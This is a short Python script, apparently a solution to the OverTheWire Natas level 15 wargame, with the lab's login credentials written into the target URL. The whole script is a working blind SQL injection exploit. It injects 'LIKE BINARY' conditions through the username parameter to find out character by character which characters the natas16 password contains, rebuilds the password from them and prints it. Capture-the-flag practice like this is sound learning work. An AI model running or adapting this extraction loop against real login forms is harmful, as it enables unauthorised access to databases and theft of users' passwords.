import requests
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
address = "http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php"
charsInPass = ""
pwd = ""

for i in range(0, len(possibleChars)):
	r = requests.get(address+'?username=natas16" AND password LIKE BINARY "%' + possibleChars[i] +'%" "')
	if "This user exists." in r.text:
		charsInPass = charsInPass + possibleChars[i]

print("Possible characters in password are: "+charsInPass)
for i in range(0, 32):
	for j in range(0, len(charsInPass)):
		r = requests.get(address+'?username=natas16" AND password LIKE BINARY "' + pwd + charsInPass[j] +'%" "')
		if "This user exists." in r.text:
			pwd = pwd + charsInPass[j]
			print(pwd)
			break	
			
print("Password found! It's "+pwd)
